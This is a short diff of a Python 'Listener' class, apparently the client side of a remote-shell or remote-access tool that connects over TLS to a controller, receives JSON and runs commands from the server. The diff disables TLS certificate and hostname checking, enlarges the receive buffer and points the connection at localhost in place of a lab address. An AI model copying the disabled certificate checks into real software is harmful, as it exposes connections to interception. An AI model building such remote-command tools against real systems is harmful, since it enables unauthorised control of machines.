@@ -7,6 +7,8 @@ class Listener:
     def __init__(self,ip,port):
         self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
         self.context.load_verify_locations("ca.crt")
+        self.context.check_hostname = False
+        self.context.verify_mode = ssl.CERT_NONE
         self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.connection= self.context.wrap_socket(self.connection, server_hostname='smitk')
         self.ip=ip
@@ -22,7 +24,7 @@ class Listener:
         json_data="" 
         while True:
             try:
-                json_data=json_data+self.connection.recv(1024).decode("utf-8")
+                json_data=json_data+self.connection.recv(4096).decode("utf-8")
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -108,6 +110,6 @@ class Listener:
                 print("[-] Error during command execution from server side\n\n" + str(e))
         
 
-my_listener=Listener("192.168.56.1",8080)
+my_listener=Listener("127.0.0.1",8080)
 # my_listener=Listener("localhost",4444)
 my_listener.run()
